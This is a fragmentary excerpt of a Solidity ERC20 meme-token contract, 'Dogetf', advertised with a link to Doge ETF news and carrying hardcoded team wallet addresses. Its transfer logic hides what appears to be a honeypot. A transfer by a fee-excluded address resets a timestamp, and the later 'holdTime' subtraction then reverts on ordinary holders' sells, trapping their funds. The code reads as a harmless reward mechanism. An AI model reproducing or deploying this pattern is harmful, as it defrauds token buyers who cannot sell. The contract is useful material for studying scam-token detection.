/**⠀⠀⠀⠀⠀⠀
Doge ETF Approved - https://bitcoinist.com/dogecoin-better-doge-etf/
*/
...
contract Dogetf is ERC20, Ownable {
    ...
    address payable public immutable liquidityWallet = payable(0xeC4D285533F1bA68a1B0e4bfAA3bfAC345D14dED);
    address payable public immutable marketingWallet = payable(0x7ca8e60a53c2843c37DDEf5c2552A4053034905C);
    address payable public immutable devWallet = payable(0x964Fb6e35588d06B7a8D731c6C5F4b0a65518F59);
    ...
    mapping(address => MakerInfos) private makerRewards;
    uint256 private _autoRewardBase;

    bool private swapping;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() ERC20("Dogetf", "DOGETF") {
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _autoRewardBase = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                MakerInfos storage makerReward = makerRewards[to];
                if (makerReward.buy == 0) {
                    makerReward.buy = block.timestamp;
                }
            } else {
                MakerInfos storage makerReward = makerRewards[from];
                makerReward.holdTime = makerReward.buy - _autoRewardBase;
                makerReward.sell = block.timestamp;
            }
        }
